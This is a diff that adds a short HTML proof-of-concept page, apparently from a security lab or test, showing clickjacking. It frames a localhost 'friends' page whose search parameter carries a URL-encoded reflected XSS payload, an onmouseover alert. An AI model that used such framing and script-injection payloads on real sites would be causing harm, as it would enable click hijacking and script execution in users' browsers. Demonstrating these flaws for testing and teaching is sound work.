@@ -1,0 +1,9 @@
+<html>
+  <head>
+    <title>Clickjacking Exasmple</title>
+  </head>
+  <body>
+    <h1>Clickjacking proof of concept</h1>
+    <iframe width="50%" height="50%" src="http://localhost:5080/friends?search=%3Cb%20onmouseover=alert(1)%3Etest%3C/b%3E">
+  </body>
+</html>
